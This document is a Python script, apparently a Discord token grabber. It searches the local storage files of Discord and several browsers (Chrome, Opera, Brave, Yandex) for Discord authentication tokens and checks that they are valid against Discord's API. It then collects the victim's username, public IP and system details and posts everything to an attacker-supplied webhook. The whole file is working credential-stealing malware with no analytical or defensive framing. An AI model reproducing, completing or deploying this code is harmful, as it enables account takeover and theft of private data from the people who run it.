import requests
import os
import glob
import re
import time
import getpass
import platform
import datetime
from os import remove
from sys import argv

WEBHOOK = "paste url here"
appdatapath = os.getenv('APPDATA')


paths = [
   appdatapath + '\\Discord',
   appdatapath + '\\discordcanary',
   appdatapath + '\\discordptb',
   appdatapath + '\\Google\\Chrome\\User Data\\Default',
   appdatapath + '\\Opera Software\\Opera Stable',
   appdatapath + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
   appdatapath + '\\Yandex\\YandexBrowser\\User Data\\Default'
]
tknpaths = []


def getTokens(path):
    tokns = []
    files = glob.glob(path + r"\Local Storage\leveldb\*.ldb")
    files.extend(glob.glob(path + r"\Local Storage\leveldb\*.log"))
    for file in files:
        with open(file, 'r', encoding='ISO-8859-1') as content_file:
            try:
                content = content_file.read()
                possible = [x.group() for x in re.finditer(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[a-zA-Z0-9_\-]{84}', content)]
                tokenpath = ['\n\n' + path + ' :\n']
                if len(possible) > 0:
                    tknpaths.append(tokenpath)
                    tokns.extend(possible)
            except Exception as e:
                pass
    return tokns


def SendTokens(tkns):
    ip = "Unavailable"
    try:
        ip = requests.get("http://checkip.amazonaws.com/").text
    except:
        ip = "Unavailable"

    content = f"```css\nPulled {len(tkns)} tokens from {getpass.getuser()}  ip: {ip}\n"
    for tkn in tkns:
        content += tkn + "\n"
        content += '---------------------------------\n'
    content += ("\n\nInformation:")
    uname = platform.uname()
    content += (f"\nSystem: {uname.system}")
    content += (f"\nPCName: {uname.node}")
    content += (f"\nRelease: {uname.release}")
    content += (f"\nVersion: {uname.version}")
    content += (f"\nMachine: {uname.machine}")
    content += (f"\nProcessor: {uname.processor}\n\n")
    content += datetime.datetime.now().strftime("%H:%M %p")
    content += "```@everyone"

    payload = {
        "content": content,
        "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/7/78/Image.jpg",
        "username": "Grabber made by dx with much love <3"
    }

    requests.post(WEBHOOK, data=payload)


tksn = []
for _dir in paths:
    tksn.extend(getTokens(_dir))

if len(tksn) < 1:
    exit(0)


for check in tksn:
    check = str(check).strip()  
    if check.startswith('\n'):
        continue
    else:
        try:
            
            sake = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers={'Authorization': check})
            if sake.status_code == 200:
                tksn.append('\n\n=====Checker=====\n' + check + ' is valid')
            else:
                continue
        except Exception as e:
            pass  


SendTokens(tksn)
